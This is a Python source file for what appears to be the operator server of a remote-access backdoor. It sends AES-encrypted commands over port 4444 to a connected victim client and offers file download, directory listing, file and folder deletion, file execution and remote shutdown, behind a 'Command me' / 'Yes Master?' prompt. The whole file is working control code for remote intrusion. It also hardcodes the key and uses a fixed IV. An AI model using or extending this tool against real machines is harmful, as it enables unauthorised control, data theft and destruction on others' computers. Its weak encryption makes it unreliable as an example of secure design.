import socket
import urllib.request
from Crypto.Cipher import AES
import time
import os

def help():
    print("\n\n")
    print("This is the help function. Welcome to our Server \n")
    print("You can download by typing download and the name of the file.\n")
    print("Command: getcwd  Usage: Prints the current working directory.\n")
    print("Command: chdir  Usage: Changes the working directory. Example: chdir /home/somefolder/someotherfolder.\n")
    print("Command: listdir  Usage: List of all files and folders inside the working directory. Example: listdir .\n")
    print("Command: shutdown  Usage: Shut down or Restart the computer in 1 min. Example: shutdown -s or shutdown -r .\n")
    print("Command: removedirs  Usage: Removes the whole directory. Example: removedirs /home/somefolder/someotherfolder.\n")
    print("Command: remove Usage: Removes a file. Example: remove somefile.txt\n")
    print("Command: makedirs Usage: Make new directories note that the path starts from your current working directory. Example: makedirs /makeafolder/andanotherinside .\n")
    print("Command: create Usage: Creates a new file. Example create newfile.txt\n")
    print("Command: execute Usage: Executes a file(note that in linux you can only excecute python scripts). \n")
    print("Command: read Usage: Read a file. Example read newfile.txt\n")
    print("Command: write Usage: Write text to a given file !note that you must choose the file and then send the data. Example: write myfile.txt send it and then write the text you want written.\n")


def customPadding(messageToPad):
    while(len(messageToPad)%16!=0):
        messageToPad+="~"
    return  messageToPad

def encryption(messageToEncrypt):
    try:
        messageToEncrypt=customPadding(messageToEncrypt)
        obj = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
        return obj.encrypt(messageToEncrypt)
    except:
        return "Something went wrong with the encryption: ", messageToEncrypt

def decryption(ciphertext):
    try:
        obj2 = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
        return (obj2.decrypt(ciphertext).decode()).replace("~","")
    except:
        return "Something went wrong with the decryption: " ,ciphertext

def download(filename,conn):
    with open(filename, 'wb') as f:
        print('file opened')
        print('receiving data...')
        while True:
            print('.',end='') 
            data = conn.recv(4096)
            try:
                if data.decode()=="_EOD_":
                    break
                else:
                    f.write(data)   
            except:
                 f.write(data)
    print('closing the file...')
    f.close()
    print('Successfully get the file')

def orders():
    order=input("Command me: ")
    while(order=="" or order[0:8]=="download" and (order[9:]=="" or not order[9:].strip())):
        order=input("Yes Master? ")
    return order

def server():
    mySocket = socket.socket()
    mySocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    mySocket.bind(("127.0.0.1",4444))
    mySocket.listen(1)#only 1 client can connect
    print("Listening for incoming connections")
    conn,addr = mySocket.accept()
    print('Connection from: {}'.format(addr))
    sending_message= orders()
    while sending_message!= 'quit':
        if(sending_message[0:8]=="download"):
            conn.send(encryption(sending_message))
            download(sending_message[9:],conn)
            sending_message= orders()
        elif sending_message=="help" or sending_message=="HELP" or sending_message=="Help":
            help()
            sending_message= orders()
        else:
            conn.send(encryption(sending_message))
            received_message = decryption(conn.recv(4096))
            print(received_message)
            sending_message = orders()
    conn.send(encryption("quit"))    
    conn.close()
    print("Server shut down...")

if __name__ == "__main__":
    #secret_key = os.urandom(BLOCK_SIZE) i generated once and i will use that always
    secret_key=b'b\x90\xf7\x1d\\KY\xc3\xd7\x13\xf1\x90\xba\xe4HS\xe3\xce\x1cd\x8f\xdf\xda\xc8u\xa9B\x85-&<\xb7'
    Initialization_vector = 'This is a testIV'#IV must be 16 bytes long   
    server()
